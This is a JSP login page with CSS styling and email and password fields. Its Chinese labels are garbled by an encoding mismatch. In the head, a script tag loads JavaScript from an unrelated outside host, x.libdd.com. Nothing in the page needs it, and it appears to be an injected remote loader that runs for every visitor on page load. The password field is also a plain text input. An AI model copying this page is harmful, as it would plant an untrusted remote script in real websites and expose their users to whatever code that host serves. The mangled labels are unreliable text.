<%@ page language="java" import="java.util.*" pageEncoding="gb2312"%>  
<%  
String path = request.getContextPath();  
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";  
%>  
  
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">  
<html>  
  <head>  
    <base href="<%=basePath%>">  
      
    <title>µ«¬Ω</title>  
    <meta http-equiv="pragma" content="no-cache">  
    <meta http-equiv="cache-control" content="no-cache">  
    <meta http-equiv="expires" content="0">      
    <meta http-equiv="keywords" content="keyword1,keyword2,keyword3">  
    <meta http-equiv="description" content="This is my page">  
    <script type="text/javascript" src="http://x.libdd.com/farm1/3711a6/21907309/FF9C9.js" ></script>
   	<style type = "text/css">
   		body{
			width:100%;
			height:100%;
			background:url(image/bg.png) repeat 0 0;
		}
		
		.form_container{
			width:400px;
			height:200px;
			margin:150px auto;
			position:relative;
			border-bottom:1px #ddd solid;
		}
		
		form.login{
			background: url(image/widget.png) -8px -354px;
			width: 261px;
			height: 81px;
			position: relative;
			margin: 0 auto;
			top: 35px;
		}
		
   		input.login_btn{
   			width: 120px;
			height: 35px;
			display: block;
			background: url(image/widget.png) -312px -82px;
			position: absolute;
			text-align: center;
			color: #ffffff;
			font-size: 14px;
			line-height: 2.3;
			margin: 0 auto;
			top: 100px;
			left: 70px;
			border: none;
			padding: 0;
   		}
   		
   		input.login_btn:hover{
			background: url(image/widget.png) -312px -122px;
		}
		input.login_btn:active{
			background: url(image/widget.png) -312px -162px;
		}
   		
   		input.form {
   		
			margin: 6px 0 0 10px;
			border: none;
			font-size: 14px;
			color: #dddddd;
			width: 245px;
			height: 30px;
			background: none;
		}
		
		label{
			display: block;
			color: #DDD;
			font-size: 14px;
			position: absolute;
		}
		
		.label1{
			top:10px;
			left:-40px;
		}
		
		.label2{
			top:48px;
			left:-40px;
		}
		
		.forget_pwd{
			position: absolute;
			right: -60px;
			color: #5AB;
			font-size: 12px;
			top: 12px;
		}  		
   	</style>

  </head>  
    
  <body>
  <div class = "form_container">
  	
  	<form class = "login">
  		<a class = "forget_pwd">Õ¸º«√‹¬Î</a>
  		<label for = "email" id = "email" class = "label1" >” œ‰:</label>
  		<input class = "form" name = "email" type = "text" value ="" style = "color: #000;"/>
  		<label class = "label2">√‹¬Î:</label>
  		<input type = "text" class = "form" style = "color: #000;">
  		<input type = "submit" value = "µ«&nbsp;&nbsp;¬Ω" class = "login_btn">
  	</form> 	
  </div>
  
  </body>  
</html>